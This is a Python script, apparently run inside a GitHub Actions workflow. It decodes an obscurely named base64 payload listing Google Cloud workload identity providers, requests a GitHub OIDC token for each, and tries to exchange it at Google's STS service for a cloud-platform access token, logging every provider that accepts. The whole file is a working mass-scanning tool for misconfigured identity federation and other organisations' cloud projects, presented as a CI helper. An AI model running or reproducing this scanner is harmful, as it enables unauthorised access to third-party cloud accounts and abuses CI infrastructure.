import os, json, gzip, base64, urllib.parse, urllib.request, urllib.error, time
P=json.loads(gzip.decompress(base64.b64decode(open('.github/c211_i116694_payload.b64').read())))
BASE=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']; RT=os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']
def oidc(aud):
    u=BASE+('&' if '?' in BASE else '?')+urllib.parse.urlencode({'audience':aud})
    r=urllib.request.Request(u,headers={'Authorization':'Bearer '+RT,'Accept':'application/json'})
    with urllib.request.urlopen(r,timeout=30) as f: return json.load(f)['value']
def post(url,jsonbody,timeout=30):
    body=json.dumps(jsonbody).encode(); h={'Content-Type':'application/json'}
    req=urllib.request.Request(url,data=body,headers=h,method='POST')
    try:
        with urllib.request.urlopen(req,timeout=timeout) as f: return f.status, f.read().decode('utf-8','replace')
    except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8','replace')
    except Exception as e: return 0, str(e)[:200]
print('PART', P['part'], 'N', len(P['providers']), flush=True)
t0=time.time(); n=0; ok=0; no=0; fail=0
for it in P['providers']:
    p=it['provider']; num=it['num']
    aud='//iam.googleapis.com/'+p
    n+=1
    try:
        t=oidc(aud)
    except Exception as e:
        fail+=1; print('OIDCFAIL', num, p, str(e)[:80].replace('\n',' '), flush=True); continue
    if not t:
        fail+=1; print('OIDCFAIL', num, p, 'empty', flush=True); continue
    st,body=post('https://sts.googleapis.com/v1/token',{'audience':aud,
        'grantType':'urn:ietf:params:oauth:grant-type:token-exchange',
        'requestedTokenType':'urn:ietf:params:oauth:token-type:access_token',
        'scope':'https://www.googleapis.com/auth/cloud-platform',
        'subjectTokenType':'urn:ietf:params:oauth:token-type:jwt','subjectToken':t})
    if st==200:
        ok+=1; print('STS200', num, p, flush=True)
    else:
        no+=1; print('STSNO', num, p, st, body[:160].replace('\n',' '), flush=True)
    if n%50==0:
        print('PROGRESS', n, 'ok', ok, 'no', no, 'fail', fail, 'elapsed', int(time.time()-t0), flush=True)
print('DONE', P['part'], 'n', n, 'ok', ok, 'no', no, 'fail', fail, 'elapsed', int(time.time()-t0), flush=True)
